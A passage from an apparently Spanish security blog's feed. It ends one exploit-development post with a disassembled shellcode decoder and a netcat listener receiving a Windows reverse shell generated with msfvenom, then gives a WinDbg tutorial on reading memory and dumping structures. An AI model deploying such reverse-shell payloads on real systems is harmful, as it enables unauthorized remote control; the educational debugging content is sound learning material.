&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9cb 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9cc 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9cd 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9ce 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9cf 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9d0 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9d1 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9d2 ba13a89510      mov     edx,1095A813h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9d7 ddc0            ffree   st(0)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9d9 d97424f4        fnstenv [esp-0Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9dd 58              pop     eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9de 29c9            sub     ecx,ecx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9e0 b152            mov     cl,52h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9e2 83c004          add     eax,4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9e5 31500e          xor     dword ptr [eax+0Eh],edx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9e8 0343a6          add     eax,dword ptr [ebx-5Ah]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9eb 77e5            ja      00a2f9d2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9ed 9f              lahf
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nos ponemos a la escucha mediante netcat por el puerto 443 que es el que se ha definido en la shell inversa con msfvenom.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dreamer@debian:~$ sudo nc -lvnp 443
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Listening on 0.0.0.0 443
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Connection received on 192.168.1.131 49797
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Microsoft Windows [Versi�n 10.0.19045.6456]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(c) Microsoft Corporation. Todos los derechos reservados.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;C:\Users\dreamer\Downloads&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Explicación de comandos en WinDBG</title>
		<published>2025-11-07T00:00:00+00:00</published>
		<updated>2025-11-07T00:00:00+00:00</updated>
		<link rel="alternate" type="text/html" href="https://example.com/posts/uso-windbg/"/>
		<id>https://example.com/posts/uso-windbg/</id>
    
		<content type="html" xml:base="https://example.com/posts/uso-windbg/">&lt;p&gt;WinDbg es un depurador que se puede usar para analizar volcados de memoria, depurar el modo de usuario activo y el código en modo kernel, y examinar los registros de CPU y la memoria.&lt;&#x2F;p&gt;
&lt;p&gt;En este caso solo nos enfocaremos en el &lt;strong&gt;modo usuario&lt;&#x2F;strong&gt;, y se mostrarán los ejemplos con el bloc de notas de Windows de 32 bits (notepad).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;interfaz-de-windbg&quot;&gt;Interfaz de WinDbg&lt;a class=&quot;zola-anchor&quot; href=&quot;#interfaz-de-windbg&quot; aria-label=&quot;Anchor link for: interfaz-de-windbg&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;La pantalla de inicio del depurador es la siguiente:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;windbg&#x2F;1.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Para &quot;adjuntar&quot; un proceso, haremos clic en archivo situado en la parte izquierda superior y como se muestra en la foto, de nuevo, haremos doble clic sobre &lt;code&gt;notepad.exe&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;windbg&#x2F;2.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;El depurador inyecta un punto de interrupción de software sobrescribiendo la instrucción actual en la memoria con una instrucción de ensamblador (&lt;code&gt;INT 3&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;windbg&#x2F;3.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;WinDbg también cuenta con símbolos de depuración que le permiten referenciar funciones internas, estructuras y variables globales mediante nombres en lugar de direcciones.&lt;&#x2F;p&gt;
&lt;p&gt;Los archivos &lt;code&gt;.PDB&lt;&#x2F;code&gt;, se crean cuando Microsoft compila los archivos nativos en Windows. Microsoft no proporciona estos archivos de símbolos para todos los archivos, además las aplicaciones de terceros pueden tener sus propios archivos de símbolos.&lt;&#x2F;p&gt;
&lt;p&gt;La ruta que se utiliza es &lt;code&gt;C:\Symbols&lt;&#x2F;code&gt; y los módulos se pueden cargar mediante &lt;code&gt;.reload&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:007&amp;gt; .reload &#x2F;f
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Reloading current modules
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;acceso-y-manipulacion-de-la-memoria&quot;&gt;Acceso y manipulación de la memoria&lt;a class=&quot;zola-anchor&quot; href=&quot;#acceso-y-manipulacion-de-la-memoria&quot; aria-label=&quot;Anchor link for: acceso-y-manipulacion-de-la-memoria&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;WinDbg proporciona una gran cantidad de comandos para poder desensamblar, leer y modificar la memoria.&lt;&#x2F;p&gt;
&lt;p&gt;Para poder desensamblar se hace con el comando &lt;code&gt;u&lt;&#x2F;code&gt;, que acepta una sola dirección de memoria o un rango de memoria como argumento, si no se especifica este argumento, comenzará desde &lt;code&gt;EIP&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; u kernel32!Writefile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;KERNEL32!WriteFile:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd830 ff2524955377    jmp     dword ptr [KERNEL32!_imp__WriteFile (77539524)]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd836 cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd837 cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd838 cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd839 cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd83a cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd83b cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;774dd83c cc              int     3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En cambio, para poder leer la memoria tenemos diferentes maneras de poder mostrarlo en el depurador:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Mostrar los bytes:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; db esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff8e4  09 b5 8b 77 7b 84 c8 81-d0 b4 8b 77 d0 b4 8b 77  ...w{......w...w
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff8f4  00 00 00 00 e8 f8 df 02-00 00 00 00 6c f9 df 02  ............l...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff904  c0 85 88 77 ab ee 98 f4-00 00 00 00 20 f9 df 02  ...w........ ...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff914  09 d1 4c 77 00 00 00 00-f0 d0 4c 77 7c f9 df 02  ..Lw......Lw|...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff924  0d 25 81 77 00 00 00 00-17 84 c8 81 00 00 00 00  .%.w............
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff934  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff944  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff954  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;Mostrar los datos en WORDS:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; dw esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff8e4  b509 778b 847b 81c8 b4d0 778b b4d0 778b
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff8f4  0000 0000 f8e8 02df 0000 0000 f96c 02df
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff904  85c0 7788 eeab f498 0000 0000 f920 02df
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff914  d109 774c 0000 0000 d0f0 774c f97c 02df
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff924  250d 7781 0000 0000 8417 81c8 0000 0000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff934  0000 0000 0000 0000 0000 0000 0000 0000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff944  0000 0000 0000 0000 0000 0000 0000 0000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dff954  0000 0000 0000 0000 0000 0000 0000 0000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;Mostrar los datos en DWORD:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf8f8  775bb509 0c027ab8 775bb4d0 775bb4d0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf908  00000000 02dbf8fc 00000000 02dbf980
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf918  775885c0 7986105c 00000000 02dbf934
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf928  769dd109 00000000 769dd0f0 02dbf990
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf938  7751250d 00000000 0c027a0c 00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf948  00000000 00000000 00000000 00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf958  00000000 00000000 00000000 00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf968  00000000 00000000 00000000 00000000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;Mostrar los datos en QWORDS:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dq 02dbf8f8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf8f8  0c027ab8`775bb509 775bb4d0`775bb4d0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf908  02dbf8fc`00000000 02dbf980`00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf918  7986105c`775885c0 02dbf934`00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf928  00000000`769dd109 02dbf990`769dd0f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf938  00000000`7751250d 00000000`0c027a0c
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf948  00000000`00000000 00000000`00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf958  00000000`00000000 00000000`00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf968  00000000`00000000 00000000`00000000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También se puede formar en formato &lt;strong&gt;ASCII&lt;&#x2F;strong&gt; &#x2F; &lt;strong&gt;UNICODE&lt;&#x2F;strong&gt; y seleccionar la memoria que se desea ver ya que por defecto WInDbg muestra &lt;code&gt;0x80&lt;&#x2F;code&gt; bytes:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;No confundir &lt;code&gt;dw&lt;&#x2F;code&gt; con &lt;code&gt;dW&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dc KERNELBASE 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420000  00905a4d 00000003 00000004 0000ffff  MZ..............
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420010  000000b8 00000000 00000040 00000000  ........@.......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420020  00000000 00000000 00000000 00000000  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420030  00000000 00000000 00000000 000000f8  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420040  0eba1f0e cd09b400 4c01b821 685421cd  ........!..L.!Th
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420050  70207369 72676f72 63206d61 6f6e6e61  is program canno
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420060  65622074 6e757220 206e6920 20534f44  t be run in DOS 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420070  65646f6d 0a0d0d2e 00000024 00000000  mode....$.......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dW KERNELBASE L4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420000  5a4d 0090 0003 0000                      MZ......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;db KERNELBASE L5
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75420000  4d 5a 90 00 03                                   MZ...
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También hay la posibilidad de mostrar los datos mediante el comando &quot;puntero a datos(&lt;code&gt;poi&lt;&#x2F;code&gt;)&quot;, que muestra los datos referenciados desde una dirección de memoria, se usará &lt;code&gt;esp&lt;&#x2F;code&gt; para simular una desreferencia de memoria.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd esp L1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02dbf8f8  775bb509
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd 775bb509
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb509  c03307eb 658bc340 fc45c7e8 fffffffe
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb519  b0e8006a ccfff570 cccccccc cccccccc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb529  cccccccc 8bcccccc ec8b55ff 180d8b64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb539  8b000000 81890845 00000f24 0004c25d
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb549  cccccccc 8bcccccc ec8b55ff 0018a164
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb559  b0ff0000 00000f24 e80875ff fffc4157
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb569  0004c25d cccccccc cccccccc cccccccc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb579  cccccccc 8bcccccc ec8b55ff 640875ff
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd poi(esp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb509  c03307eb 658bc340 fc45c7e8 fffffffe
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb519  b0e8006a ccfff570 cccccccc cccccccc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb529  cccccccc 8bcccccc ec8b55ff 180d8b64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb539  8b000000 81890845 00000f24 0004c25d
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb549  cccccccc 8bcccccc ec8b55ff 0018a164
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb559  b0ff0000 00000f24 e80875ff fffc4157
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb569  0004c25d cccccccc cccccccc cccccccc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;775bb579  cccccccc 8bcccccc ec8b55ff 640875ff
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;volcado-de-estructuras&quot;&gt;Volcado de estructuras&lt;a class=&quot;zola-anchor&quot; href=&quot;#volcado-de-estructuras&quot; aria-label=&quot;Anchor link for: volcado-de-estructuras&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;WinDbg también tiene la capacidad de poder poder volcar las estructuras con el comando &lt;code&gt;dt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dt ntdll!_TEB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 NtTib            : _NT_TIB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c EnvironmentPointer : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x020 ClientId         : _CLIENT_ID
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 ActiveRpcHandle  : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c ThreadLocalStoragePointer : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x034 LastErrorValue   : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x038 CountOfOwnedCriticalSections : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x03c CsrClientThread  : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x040 Win32ThreadInfo  : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x044 User32Reserved   : [26] Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x0ac UserReserved     : [5] Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x0c0 WOW32Reserved    : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0xfd8 LockCount        : Uint4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0xfdc WowTebOffset     : Int4B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0xfe0 ResourceRetValue : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0xfe4 ReservedForWdf   : Ptr32 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0xfe8 ReservedForCrt   : Uint8B
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0xff0 EffectiveContainerId : _GUID
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En este caso la dirección opcional para la estructura no se proporcionó y se muestra tanto los campos de la estructura como el desplazamiento. Cada campo especificado para esa estructura se muestra en su desplazamiento relativo especifico dentro de la estructura.&lt;&#x2F;p&gt;
&lt;p&gt;En los casos en que un campo apunta a una estructura anidada, el tipo de dato del campo se reemplaza por el tipo de subestructura correcto, también se puede identificar porque está compuesto por un guión bajo y el nombre en mayúscula.&lt;&#x2F;p&gt;
&lt;p&gt;EL campo &lt;code&gt;NtTib&lt;&#x2F;code&gt; que está en el desplazamiento &lt;code&gt;0x0&lt;&#x2F;code&gt; es una estructura anidada de tipo &lt;code&gt;_NT_TIB&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Si se conoce la dirección de memoria de una estructura, se pueda pasar el comando &lt;code&gt;dt -r&lt;&#x2F;code&gt;, que mostrara de forma recursiva las estructuras anidadas.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; dt -r ntdll!_TEB @$teb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; +0x000 NtTib            : _NT_TIB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x000 ExceptionList    : 0x02dbf914 _EXCEPTION_REGISTRATION_RECORD
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x000 Next             : 0x02dbf980 _EXCEPTION_REGISTRATION_RECORD
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x004 Handler          : 0x775885c0           _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x004 StackBase        : 0x02dc0000 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x008 StackLimit       : 0x02dbc000 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x00c SubSystemTib     : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x010 FiberData        : 0x00001e00 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x010 Version          : 0x1e00
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x014 ArbitraryUserPointer : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x018 Self             : 0x02a46000 _NT_TIB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x000 ExceptionList    : 0x02dbf914 _EXCEPTION_REGISTRATION_RECORD
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x004 StackBase        : 0x02dc0000 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x008 StackLimit       : 0x02dbc000 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x00c SubSystemTib     : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x010 FiberData        : 0x00001e00 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x010 Version          : 0x1e00
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x014 ArbitraryUserPointer : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         +0x018 Self             : 0x02a46000 _NT_TIB
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c EnvironmentPointer : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x020 ClientId         : _CLIENT_ID
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x000 UniqueProcess    : 0x00001bd0 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      +0x004 UniqueThread     : 0x000008a8 Void
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 ActiveRpcHandle  : (null) 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c ThreadLocalStoragePointer : (null)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x030 ProcessEnvironmentBlock : 0x02a3e000 _PEB
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También podemos mostrar los campos específicos pasando el nombre del campo como parámetro adicional:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; dt -r ntdll!_TEB @$teb ThreadLocalStoragePointer
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c ThreadLocalStoragePointer : (null)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;También se puede mostrar el tamaño de una estructura extraída de un archivo de símbolos, y esto se debe a que algunas API de Windows aceptan una estructura como argumento.&lt;&#x2F;p&gt;
